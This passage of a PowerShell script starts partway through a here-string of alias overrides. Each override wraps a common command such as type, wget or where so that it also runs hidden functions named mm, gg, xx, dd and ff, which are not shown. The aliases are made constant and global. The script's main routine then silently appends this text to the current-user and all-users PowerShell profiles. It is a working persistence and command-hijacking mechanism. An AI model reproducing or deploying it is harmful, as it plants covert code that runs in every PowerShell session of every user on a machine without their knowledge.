Set-Alias -Name sv -Value shimmed_sv -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_swmi {Set-WMIInstance; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name swmi -Value shimmed_swmi -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_tee {Tee-Object; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name tee -Value shimmed_tee -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_trcm {Trace-Command; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name trcm -Value shimmed_trcm -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_type {Get-Content; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name type -Value shimmed_type -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_wget {Invoke-WebRequest; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name wget -Value shimmed_wget -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_where {Where-Object; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name where -Value shimmed_where -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_wjb {Wait-Job; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name wjb -Value shimmed_wjb -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
function shimmed_write {Write-Output; Invoke-Expression("mm; gg; xx; dd; ff")}
Set-Alias -Name write -Value shimmed_write -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force
'@
function write_to([string]$path, [string]$val) {
    Try {
        Add-Content -Path $path -Value $val
    }
    Catch {

    }
}

function main() {
    $curuser_allhosts = $PROFILE.CurrentUserAllHosts
    $allusers_allhosts = $PROFILE.AllUsersAllHosts
    if (!(Test-Path -Path $curuser_allhosts)) {
        Try {
            New-Item -ItemType File -Path $curuser_allhosts -Force | Out-Null
        }
        Catch { }
    }
    if (!(Test-Path -Path $allusers_allhosts)) {
        Try {
            New-Item -ItemType File -Path $allusers_allhosts -Force | Out-Null
        }
        Catch { }
    }

    try {
        write_to $curuser_allhosts $x
    }
    catch { { } }
    try {
        write_to $allusers_allhosts $x
    }
    catch { { } }
}

main